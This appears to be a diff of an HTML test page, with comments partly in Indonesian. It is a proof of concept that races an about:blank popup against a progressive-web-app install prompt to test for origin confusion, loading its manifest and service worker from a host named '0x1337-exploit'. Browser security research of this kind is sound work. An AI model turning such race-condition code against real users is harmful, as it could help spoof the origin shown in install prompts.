@@ -1,69 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Main Window for PWA Installation Test</title>
-    <link rel="manifest" href="https://0x1337-exploit.github.io/hosting/pwa/manifest.json">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Main Window for PWA Installation Test</title>
+  <link rel="manifest" href="https://0x1337-exploit.github.io/hosting/pwa/manifest.json">
 </head>
 <body>
-    <h1>Test PWA Installation Theory with Race Condition v2</h1>
-    <p>This page serves as the main window hosted on HTTPS (e.g., via GitHub Pages at github.io). The installation prompt will be handled here, with an about:blank popup opening just before the prompt to test race condition effects on origin, incorporating a 50ms delay on the prompt.</p>
+  <h1>Test PWA Installation Theory with Race Condition v2</h1>
+  <p>This page serves as the main window hosted on HTTPS (e.g., via GitHub Pages at github.io). The installation prompt will be handled here, with an about:blank popup opening just before the prompt to test race condition effects on origin, incorporating a 50ms delay on the prompt.</p>
+  
+  <button id="installPWA" style="display: none;">Install PWA</button>
+
+  <script>
+  // Register service worker in main window
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/pwa/sw.js', { scope: '/' })
+    .then(reg => console.log('Service Worker registered in main', reg))
+    .catch(err => console.log('Service Worker error in main', err));
+  }
+
+  // PWA installation logic in main window
+  let deferredPrompt;
+  let popup; // Variabel global untuk popup agar dapat diakses di fungsi race
+
+  window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
     
-    <button id="installPWA" style="display: none;">Install PWA</button>
+    // Show install button in main window
+    document.getElementById('installPWA').style.display = 'block';
+    console.log('beforeinstallprompt fired; install button shown');
+  });
+  
+  // Fungsi race condition untuk menguji about:blank
+  function race() {
+    try {
+      // Periksa apakah location bukan about:blank
+      if (popup && popup.location.href !== 'about:blank') {
+        console.log('Popup location telah berubah:', popup.location.href);
+      } else {
+        // Coba akses untuk memicu error jika cross-origin
+        popup.location.href;
+      }
+    } catch (e) {
+      console.error('Error akses popup (race condition):', e);
+      // Jika error, coba arahkan ulang ke URL PWA valid untuk menguji instalasi
+      if (popup) {
+        popup.location.href = 'https://0x1337-exploit.github.io/hosting/pwa/';
+        console.log('Mengarahkan popup ke URL PWA untuk uji instalasi');
+        
+        // Coba registrasi service worker di popup setelah redirect (untuk pengujian)
+        setTimeout(() => {
+          if ('serviceWorker' in popup.navigator) {
+            popup.navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/pwa/sw.js', { scope: '/' })
+            .then(reg => popup.console.log('Service Worker registered in popup', reg))
+            .catch(err => popup.console.log('Service Worker error in popup', err));
+          }
+          
+          // Coba trigger beforeinstallprompt di popup (kemungkinan gagal)
+          popup.addEventListener('beforeinstallprompt', (e) => {
+            popup.console.log('beforeinstallprompt fired in popup');
+          });
+        }, 100); // Delay kecil untuk menunggu redirect
+      }
+    }
+  }
 
-    <script>
-        // Register service worker in main window
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/pwa/sw.js', { scope: '/' })
-                .then(reg => console.log('Service Worker registered in main', reg))
-                .catch(err => console.log('Service Worker error in main', err));
+  // Handle install button click with race condition test and 50ms delay on prompt
+  document.getElementById('installPWA').addEventListener('click', async () => {
+    if (deferredPrompt) {
+      // Open about:blank popup immediately upon button click (before prompting)
+      popup = window.open('about:blank', 'blankPopup', 'width=600,height=400');
+      if (popup) {
+        console.log('about:blank popup opened to test race condition');
+        // Optionally inject minimal content into popup if needed
+        popup.document.open();
+        popup.document.write('<h1>Blank Popup for Race Condition Test</h1><p>Mencoba menguji instalasi PWA di sini.</p>');
+        popup.document.close();
+        
+        // Mulai race condition segera
+        setInterval(race, 0);
+      } else {
+        console.log('Popup blocked during race condition test');
+      }
+      
+      // Introduce 50ms delay before triggering the prompt
+      setTimeout(async () => {
+        deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        if (outcome === 'accepted') {
+          console.log('PWA installation accepted');
+        } else {
+          console.log('PWA installation dismissed');
         }
+        deferredPrompt = null;
+      }, 50);
+    } else {
+      alert('PWA installation prompt not available. Ensure the site meets PWA criteria (HTTPS, manifest, service worker). As a fallback, manually add to home screen via your browser\'s share menu.');
+    }
+  });
 
-        // PWA installation logic in main window
-        let deferredPrompt;
-        
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            
-            // Show install button in main window
-            document.getElementById('installPWA').style.display = 'block';
-            console.log('beforeinstallprompt fired; install button shown');
-        });
-        
-        // Handle install button click with race condition test and 50ms delay on prompt
-        document.getElementById('installPWA').addEventListener('click', async () => {
-            if (deferredPrompt) {
-                // Open about:blank popup immediately upon button click (before prompting)
-                const popup = window.open('about:blank', 'blankPopup', 'width=600,height=400');
-                if (popup) {
-                    console.log('about:blank popup opened to test race condition');
-                    // Optionally inject minimal content into popup if needed
-                    popup.document.open();
-                    popup.document.write('<h1>Blank Popup for Race Condition Test</h1>');
-                    popup.document.close();
-                } else {
-                    console.log('Popup blocked during race condition test');
-                }
-                
-                // Introduce 50ms delay before triggering the prompt
-                setTimeout(async () => {
-                    deferredPrompt.prompt();
-                    const { outcome } = await deferredPrompt.userChoice;
-                    if (outcome === 'accepted') {
-                        console.log('PWA installation accepted');
-                    } else {
-                        console.log('PWA installation dismissed');
-                    }
-                    deferredPrompt = null;
-                }, 50);
-            } else {
-                alert('PWA installation prompt not available. Ensure the site meets PWA criteria (HTTPS, manifest, service worker). As a fallback, manually add to home screen via your browser\'s share menu.');
-            }
-        });
-        
-        // Note: This setup tests if the installation prompt adopts the about:blank origin due to race condition timing with a 50ms delay. The manifest's start_url defines the final PWA origin.
-    </script>
+  // Note: This setup tests if the installation prompt adopts the about:blank origin due to race condition timing with a 50ms delay. The manifest's start_url defines the final PWA origin.
+  </script>
 </body>
 </html>
